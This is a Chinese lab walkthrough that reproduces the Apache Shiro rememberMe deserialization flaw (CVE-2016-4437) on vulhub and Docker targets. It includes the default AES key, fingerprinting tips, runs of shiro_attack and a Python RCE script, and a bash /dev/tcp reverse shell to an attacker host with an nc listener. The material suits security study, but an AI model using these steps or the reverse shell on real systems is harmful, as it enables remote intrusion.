一、 shiro简介
----------

### 1、shiro简述

维基百科

```php
https://zh.wikipedia.org/wiki/Apache_Shiro
```

apache shiro 是企业常见的java安全框架，执行身份验证、授权、密码和回话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。

### 2、shiro漏洞原理

Apache shiro框架提供了记住我的功能（Rememberme),用户登录成功后生成经过加密并编码的cookie。cookie的key为rememberme，cookie的值是经过对相关的信息进行序列化，然后实用aes加密，最后在使用b ase64编码处理形成的。

在服务端接收到cookie值时，按照如下步骤来解析处理：

```php
1、检索RememberMe cooike的值
2、b ase 64解码
3、使用aes解密（加密秘钥硬编码）
4、进行反序列化操作（未做过过滤处理）
在调用反序列化时未进行任何过滤，导致可以出发远程代码执行漏洞
```

### 3、shire序列化利用条件

由于使用了aes加密，想要成功利用漏洞则需要获取ase的加密秘钥，而在shiro的1.2.4之前的版本中使用的硬编码。其中默认秘钥的b ase64编码后的值为kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后欧威cooike加密发送，服务端接受后会解密并触发反序列化漏洞。

尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决方法，而是通过去掉硬编码的秘钥，使其每次生成一个密码来解决给漏洞。但是目前一些开源系统、教程范例代码都使用了固定的编码，这里可以通过搜索引擎，github等来收集秘钥，通过漏洞检查与利用的成功率。

### 4、shiro漏洞指纹

```php
返回包中存在set-cooike:rememberme=deleteme
或者url中有shiro字样
有时候服务器不会主动返回remember=deleteme，直接发包即可
```

二、本地搭建
------

### 1、环境下载

```php
https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4
```

![image-20210531204811584](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4b90e0ffa0438cdc84ba703ec1d33daf0aaa7228.png)

### 2、环境安装

#### 1、安装java

因为运行tomcat需要java环境

![image-20210531205342029](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aeb631a555212e1bf852cced76984f00255f1ff1.png)

#### 2、 安装tomcat

安装tomcat8.5

![image-20210531205505860](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d75a3810d61f5b8c1b7d22aa7354eaef6e0637d4.png)

![image-20210531205607941](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d734bf3e91667a0a9e4409fe5eb4dc6e0bb3e8f6.png)

#### 3、部署shiro

将shiro.war包上传到tomcat/webapps目录下，过几秒钟war包自动解析部署

![image-20210531205755331](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d18c4f9cd5435ef3f96d8ddc066189b73721e0c.png)

注：如未出现shiro目录，需运行tomcat/bin目录下的tomcat8.exe,来部署shiro.war包

![image-20210531210014133](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5218d2f79d1895d0b7f9a8dab84a276fedaa296f.png)

访问测试

```php
http://127.0.0.1:8080/shiro/
```

![image-20210531210055573](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0ed5d0304dcdfbf042b2d3a2bf57350933fa8662.png)

```php
http://127.0.0.1:8080/shiro/login.jsp;jsessionid=79060778CC3F315FCB6D43787575B30E
```

![image-20210531210129826](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f440670e538b37e9524ab01ed2e99ef52233a715.png)

三、shiro漏洞复现
-----------

### 1、Linux 出网环境渗透shiro反序列化漏洞

CVE-2016-4437（Apache shiro 反序列化漏洞）

#### 1）漏洞描述

Apache shiro 是个java安全框架，执行身份验证、授权、密码和会话管理。只要rememberme的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。

#### 2）漏洞原理

Apache shiro框架提供了记住我（RememberMe)的功能，关闭浏览器下次在打开还能记住你是谁。下次访问是无需登录即可即访问。shiro对rememberme的cooike最了加密处理。shiro在cooikeremembermemanager类中将cookie中rememberme字段内容分别做了反序列化、aes加密、b ase64编码操作。

**原因分析：**

Apache shiro默认使用cookie remembermemanager，其处理cooike的流程是：得到rememberme的cooike值&amp;gt;b ase64解码&amp;gt;ase解码&amp;gt;反序列化。然而ase的苗药是硬编码的，就是导致攻击者可以构造恶意数据造成反序列化的RCE漏洞。

漏洞特征：

shiro反序列化的特征：在返回包中set-cooike中存在rememberme=deleteme

#### 3) 影响版本

影响shiro&amp;lt;1.2.5版本，当未设置用于“remember me&amp;quot;特性的ase秘钥时，存在反序列化漏洞。可以远程执行命令。

#### 4）漏洞启动

(1）使用vulhub,开启shiro/CVE-2016-4437漏洞

```php
cd /root/vulhub-master/shiro/CVE-2016-4437
sudo docker-compose up -d
```

![image-20210601200101369](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe69183c9302bb744fd8a1cb84903d70793c435b.png)

(2)验证是否开启

```php
sudo docker ps
```

![image-20210601200135128](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f5bce9b0d69c32817b410939afa666c5860dc977.png)

#### 5）漏洞复现

（1）访问靶机

```php
http://192.168.200.128:8080/
```

（2）确认网站是shiro搭建的

抓包

![image-20210601225615138](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ecd51f410b266be9ea2c98fe8bb8cbf794e03ff.png)

抓包后将cooike内容改为Remember Me=1,若响应包rememberMe=deleteMe，则基本可以确定网站是apache shiro搭建，效果如下图：

![image-20210601225653449](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1669e73432578a66255c621e3a35359079d64191.png)

（3）直接运行找key(使用shiro\_attack-1.5工具)

![image-20210601230045704](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3aa299acd3c9c593d591bc12aae91f6b7c85f7a.png)

![image-20210601230541093](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d219c09abf5fc580b9ae01fbad138e8fb3534bf5.png)

![image-20210601230737093](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aa278c36535d20b7ffb569e9de01e8895e562f6f.png)

成功利用shiro秘钥，远程执行了命令，获得了root权限

### 2、Linux不出网环境渗透shiro反序列化漏洞

#### 1）搭建环境

```php
#从镜像仓库中拉取或者更新指定镜像
docker pull medicean/vulapps:s_shiro_1
#创建一个新的容器并运行一个命令
docker run -d -p 8888:8080 medicean/vulapps:s_shiro_1

-d: 后台运行容器，并返回容器ID；
-P: 随机端口映射，容器内部端口随机映射到主机的端口
-p 8888:8080：将shiro环境的8080端口映射到了主机的8888端口
```

![image-20210602001017967](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b2d48aac8c60d06e933f8b9f1fb3b7159550254b.png)

![image-20210602001031458](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-77d604029c6207bccc13bd020c8e3e3ecbfd5815.png)

#### 2）验证搭建环境

```php
http://192.168.200.128:8888/
```

![image-20210602001549557](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8cb31594a135013c4996fdce70013b4f7079e24f.png)

![image-20210602001608548](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-26d7652934b992983e616602fcceda1806d9fe56.png)

搭建成功

#### 3） 抓包分析remember Me

![image-20210602001728179](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9b21d5467e7ecfb27b7f84375c84d0b9c902b4e1.png)

抓包后将cooike内容改为Remember Me=1,若响应包rememberMe=deleteMe，则基本可以确定网站是apache shiro搭建

![image-20210602001809241](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cfa2cff05bf6398aa948f1c6dfe81fb59f91e767.png)

#### 4) 不出网攻击shiro（使用shiro-1.2.4-rce脚本测试shiro漏洞）

1）需要使用python3进行执行

![image-20210602002529217](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-82dfb2319a8c179c35fe984a5db972a8ed22c31b.png)

2）分析shiro-rce脚本

![image-20210602002834451](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a88f73b214fedfe0b60458b464b6a0d945c3e13d.png)

判断逻辑，修改了源码的ysoserial-sleep.jar，主要对应延迟5的应用，然后去循环key和gadget,如果某个key和gadget组合机器延迟命令success生效了，就是存在的，还区别两个判断，linux和windows,最后在写入shell后还对发送命令进行了b ase64进行编译之后发送。

3）开始进行验证攻击测试

```php
python3 shiro-1.2.4_rce.py hhttp://192.168.200.128:8888/
```

![image-20210602003440381](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-240b66a2b53a265435765493c5077977a0337c56.png)

![image-20210602004724872](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f44c132619d52527b867cb984a1091cff0f159b8.png)

输入linux系统获得shell

6)反弹一个shell

```php
攻击方：nc -lvp 4444
上面脚本获得的shell中执行：bash -i &amp;gt;&amp; /dev/tcp/192.168.200.129/4444 0&amp;gt;&amp;1
```

![image-20210602005035246](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2bfd68c369c095cbd8e52ff79894901bfb64d831.png)

反弹shell成功

四、总结
----

1、首先对shiro反序列化漏洞原理进行分析，Apache shiro框架提供了记住Rememberme,用户登录成功后生成经过加密并编码的cookie。cookie的key为rememberme，cookie的值是经过对相关的信息进行序列化，然后实用aes加密，最后在使用b ase64编码处理形成的。

2、其次部署安装jdk、tomcat、shiro环境进行部署。

3、可以访问互联网情况下，利用DNSLOG进行，测试shiro key；不可以访问互联网情况下，循环key和gadget组合机器延迟命令，success生效了，就是存在的。

结束~